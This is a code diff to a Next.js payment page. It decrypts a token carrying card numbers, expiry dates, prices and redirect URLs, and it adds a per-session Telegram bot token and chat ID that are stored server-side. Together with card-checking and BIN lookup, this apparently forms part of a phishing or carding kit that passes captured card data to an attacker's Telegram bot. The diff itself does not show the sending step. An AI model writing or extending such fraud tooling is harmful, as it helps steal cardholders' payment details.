@@ -1,7 +1,9 @@
 import { useEffect, useState } from "react";
+import { randomUUID } from "crypto";
 import type { GetServerSideProps } from "next";
 import PaymentStatusModal from "@/components/PaymentStatusModal";
-import { decryptPayload } from "@/lib/payloadCipher";
+import { decryptEnvelope, getPrivateKeyPem } from "@/lib/rsaCipher";
+import { saveSessionCredentials } from "@/lib/sessionCredentials";
 import { CheckCardService } from "@/services/checkCardService";
 import { mapBankName, mapCardMeta } from "@/lib/binMeta";
 import { validateBin } from "@/services/bin/validate";
@@ -20,11 +22,14 @@ interface PaymentPayload {
   priceFormatted: string;
   redirectSuccess: string;
   redirectDeclined: string;
+  sessionId?: string;
+  telegram: { botToken: string; chatId: string };
 }
 
 interface HomeProps {
   valid: boolean;
   payload?: PaymentPayload;
+  sessionId?: string;
 }
 
 const localMeta = (card: string): { cardBrand: string; metodo: string } => {
@@ -41,8 +46,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
     return { props: { valid: false } };
   }
   try {
-    const secret = process.env.PAYLOAD_SECRET ?? "dev-payload-secret";
-    const payload = decryptPayload<PaymentPayload>(token, secret);
+    const payload = decryptEnvelope<PaymentPayload>(token, getPrivateKeyPem());
     const isWellFormed =
       typeof payload?.payment?.numeroTarjeta === "string" &&
       typeof payload.payment.vencimiento === "string" &&
@@ -51,18 +55,33 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
       typeof payload.price === "string" &&
       typeof payload.priceFormatted === "string" &&
       typeof payload.redirectSuccess === "string" &&
-      typeof payload.redirectDeclined === "string";
+      typeof payload.redirectDeclined === "string" &&
+      typeof payload.telegram?.botToken === "string" &&
+      typeof payload.telegram?.chatId === "string";
     if (!isWellFormed) {
       return { props: { valid: false } };
     }
-    return { props: { valid: true, payload } };
+    const sessionId = payload.sessionId ?? `p-${randomUUID()}`;
+    await saveSessionCredentials(sessionId, payload.telegram);
+    return {
+      props: {
+        valid: true,
+        sessionId,
+        payload: {
+          payment: payload.payment,
+          price: payload.price,
+          priceFormatted: payload.priceFormatted,
+          redirectSuccess: payload.redirectSuccess,
+          redirectDeclined: payload.redirectDeclined,
+        },
+      },
+    };
   } catch {
     return { props: { valid: false } };
   }
 };
 
-export default function Home({ valid, payload }: HomeProps) {
-  const [sessionId] = useState(() => `demo-${Date.now()}`);
+export default function Home({ valid, payload, sessionId }: HomeProps) {
   const [isOpen, setIsOpen] = useState(false);
   const [cardMeta, setCardMeta] = useState<{ cardBrand: string; metodo: string }>(() => ({
     cardBrand: "N/A",
@@ -146,7 +165,7 @@ export default function Home({ valid, payload }: HomeProps) {
 
   return (
     <PaymentStatusModal
-      sessionId={sessionId}
+      sessionId={sessionId ?? `p-${Date.now()}`}
       isOpen={isOpen}
       price={payload.price}
       priceFormatted={payload.priceFormatted}
